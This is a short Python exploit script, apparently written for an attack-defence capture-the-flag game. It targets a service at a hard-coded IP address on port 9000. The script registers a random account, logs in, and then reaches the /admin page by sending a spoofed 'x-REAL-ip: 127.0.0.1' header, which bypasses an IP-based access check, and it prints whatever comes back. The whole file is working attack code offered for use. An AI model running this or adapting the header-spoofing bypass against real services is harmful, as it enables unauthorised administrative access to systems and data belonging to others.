#!/usr/bin/env python3

import os
import sys


ip = '20.55.250.60'

import requests
import random

print("Exploit for challenge ?")
print(f"Attacking a team with host `{ip}`.")


chall = f"http://{ip}:9000"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
sess = requests.Session()

def register():
    global sess
    url = chall + "/register"
    username = random.choice(charset) * 5
    password = random.choice(charset) * 5
    r = sess.post(
        url,
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data = f"username={username}&password={password}"
    )
    if r.status_code == 200:
        return (username, password)
    return False

def login() -> bool:
    global sess
    url = chall + "/login"
    try:
        username, password = register()
        r = sess.post(
            url,
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data = f"username={username}&password={password}"
        )
        if r.status_code == 200:
            return True
    except:
        return False
    
def exploit():
    global sess
    url = chall + "/admin"
    r = sess.get(
        url,
        headers = {
            "x-REAL-ip" : "127.0.0.1"
        }
    )
    if r.status_code == 200:
        print(r.text, flush=True)
    else:
        return
    
register()
login()
exploit()

